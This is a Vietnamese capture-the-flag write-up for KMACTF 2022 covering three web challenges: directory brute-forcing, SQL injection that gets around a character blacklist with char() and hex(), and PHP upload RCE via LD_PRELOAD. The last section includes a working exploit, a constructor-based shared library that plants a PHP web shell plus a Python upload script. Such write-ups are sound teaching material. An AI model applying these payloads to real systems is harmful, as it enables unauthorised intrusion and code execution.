# KMACTF 2022 dot 2

## Mục lục
[Find me](#find-me)

[Inject me](#inject-me)

[Pwn me](#pwn-me)

[MineMe](#mineme)

## Find me

![Screenshot (924)](https://user-images.githubusercontent.com/71699412/174470532-485f08d4-d8ef-4873-b924-df79b0887f1b.png)

Dựa vào tên challenge, thử download hết website và grep nằm tìm flag:
```bash
wget -r -np http://45.32.110.58:20101/ -O find_me # --recursive; --no-parent
grep -ri 'kmactf'  45.32.110.58:20101 # grep pattern của flag
```

Nhưng không thấy gì, ta dùng dirsearch với default wordlist để bruteforce:

![dir](https://user-images.githubusercontent.com/71699412/174470542-2910d4d5-5376-4d09-a681-de95b41b5155.jpg)

Tìm được thư mục: `/.DS_Store`

![flag](https://user-images.githubusercontent.com/71699412/174515964-6cf11a29-e65b-4923-b84e-5e83866dcba9.png)

**flag**: `KMACTF{I wont run away anymore. I wont go back on my word. That is my ninja way! Dattebayo!}`

## Inject me

**Source**:
```python
from flask import Flask, render_template, render_template_string, request
import sqlite3
import re

# ............

def waf(str):
    if (len(str)) > 85 or "union" in str.lower():
        return False

    black_list = ["'", '"', '*', '\\', '/', '#', ';', '-']
    for c in black_list:
        if c in str:
            str = str.replace(c, "")

# ......

@app.route('/query',methods = ['GET'])
def addrec():
    if request.args.get("query") != "":
        query = request.args.get("query")
    
    query = waf(query)
    
    if query == False:
        return render_template_string("Dont cheat my fen =))")
    else:
        try:
            cur = get_db().execute('SELECT msg FROM ' + query + ' where msg like "%" and msg not like "%KMACTF{%" limit 1')
            result = cur.fetchall()

            if len(result) == 0:
                return render_template_string("No result")

            cur.close()
            return render_template("index.html", result = result)
        except:
            return render_template_string("Something went wrong")

# ............
```

```sql
SELECT msg FROM ' + query + ' where msg like "MSG-%" and msg not like "%KMACTF{%" limit 1
```
SQLi sau FROM statement.

![1](https://user-images.githubusercontent.com/71699412/174515691-eeed6a40-75bb-4a9a-9875-20b1af62b955.png)

Ở đây ta chưa biết table name lẫn column name. Ta có thể dùng kĩ thuật `nested query` để lấy `sql` từ `sqlite_master`. Tuy nhiên, column trả về ở đây buộc phải là `msg` do đó ta alias `sql` thành `msg`.

```
(select sql as msg from sqlite_master)
```

![2](https://user-images.githubusercontent.com/71699412/174515704-c7c8b16a-5c0d-4b3c-8e32-171b69a476c3.png)

Tuy nhiên trả về `No result` là bởi sau điều kiện `where`, result của `msg` phải bắt đầu với `MSG-` do đó ta cần thêm prefix trước result trả về là `MSG-`. Ngoài ra, các kí tự như `'` hay `"` bị block, không viết được chuỗi string nên ta dùng function `char()` để bypass.
```
(select (char(77, 83, 71, 45) || sql) as msg from sqlite_master)
```

![3-1](https://user-images.githubusercontent.com/71699412/174515720-9e5a3be2-a452-4819-ab00-c60ff48459c9.png)

Có column và table ta lấy flag thôi, chú ý tiếp điều kiện `not like "%KMACTF{%"` hay trong result trả về không thể chứa cụm trên, để bypass ta encode flag thành hex.

```sql
(select (char(77, 83, 71, 45) || hex(flag)) as msg from flag)
```

![4](https://user-images.githubusercontent.com/71699412/174515738-1e581c1e-a49e-4002-a7fb-7eb3a5b0cd68.png)

**Convert**:
```bash
echo 4B4D414354467B4A7573742073696D706C652073716C20696E6A656374696F6E207769746820736F6D6520747269636B737D | xxd -r -p
```

**flag**: `KMACTF{Just simple sql injection with some tricks}`

## Pwn me

Challenge cho source code:

```php
<?php

if ( isset($_GET["source"]) ) {
    highlight_file(__FILE__);
    die();
}

// Process file upload
if (isset($_FILES["file"])) {    
    // Clean storage
    $files = count(glob( "uploads/*"));
    if ($files > 100) {
        system("rm uploads/*");
    }

    $fileExt = strtolower(pathinfo($_FILES["file"]["name"],PATHINFO_EXTENSION));
    
    if ( preg_match("/ph/i", $fileExt) )
        die("Don't cheat my fen");

    $fileName = md5(rand(1, 1000000000)).".".$fileExt;
    $target_file = "uploads/" . $fileName;
    
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        die("Your file: ".getcwd()."/".$target_file);
    } else {
        die("Something went wrong\n");
    }

}
// Add enviroment variable
if (isset($_GET["env"])) {
    foreach ($_GET["env"] as $key => $value) {
        if ( preg_match("/[A-Za-z_]/i", $key) && !preg_match("/bash/i", $key) )
            putenv($key."=".$value);
    }
}

system("echo pwnme!!");

?>

<form action="/" method="post" enctype="multipart/form-data">
  Select evil file to upload:
  <input type="file" name="file"> <br />
  <input type="submit" value="Upload" name="submit">
</form>

<!-- ?source=1 -->
```

Sau khi review source code, mình come up với keyword để google: `php file upload rce enviroment variable`

Ở đây mình có tìm được 1 bài RCE với env và file upload nhưng cần hàm `mail()` được gọi. Mình cũng biết cần set biến `LD_PRELOAD`

Google tiếp: `php file upload rce enviroment variable LD_PRELOAD`

https://www.anquanke.com/post/id/175403

**Chú thích**:

1. `LD_PRELOAD`: is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so). This is called preloading a library.

2. `putenv ( string $setting ) : bool`

**Giải thích**:

Khi 1 file thực thi thực hiện 1 thao tác/hàm nào đó nó sẽ reference đến thư viện cần được sử dụng, ở đây optional env `LD_PRELOAD` chứa path đến thư viện cần reference sẽ được lựa chọn khi được set. Với việc kiểm soát được hàm set biến môi trường `putenv()` ta có thể set biến này.

Để tấn công, có 2 cách:

1. Cách thứ nhất `hijacking function`:
```c
int geteuid() 
{
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    system("ls");
}
```
Ta có thể upload 1 file compiled code C đóng vai trò là 1 shared library chứa chứa hàm bị hijack mà sẽ được gọi. Ví dụ khi 1 hàm nào đó như `mail()` sẽ gọi đến `geteuid()`. Và vì thế, chỉ có thể exploit khi mà `mail()` được gọi.

2. Cách hai `hijack shared library`:
```c
__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("ls");
}
```
Tương tự như trên, nhưng ở đây với `__attribute__ ((__constructor__))` bất cứ hàm nào load shared library này thì hàm này đều được tự động gọi.

**Exploit**:

`evil.c`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("echo \"<?php system('cat /flag.txt'); ?>\" > /var/www/html/uploads/devme.php");
}
```
Ở đây ta cần `unsetenv` trước khi vào hàm `system()` nhằm tránh lỗi

`exploit.py`:
```python
import requests
import os

os.system("gcc -Wall -fPIC -shared -o evil.so evil.c -ldl")

url = 'http://45.32.110.58:20102/'
 
files = {'file': open('evil.so','rb')}
r = requests.post(url, files=files)

file_uploaded = r.text[r.text.index(': ')+2:]

print(file_uploaded)
print(requests.get(url, params={'env[LD_PRELOAD]':file_uploaded}).status_code)

results = requests.get(url+'uploads/devme.php')
print(results.text)
```

**flag**: `KMACTF{LD_Preload is also a way to RCE}`
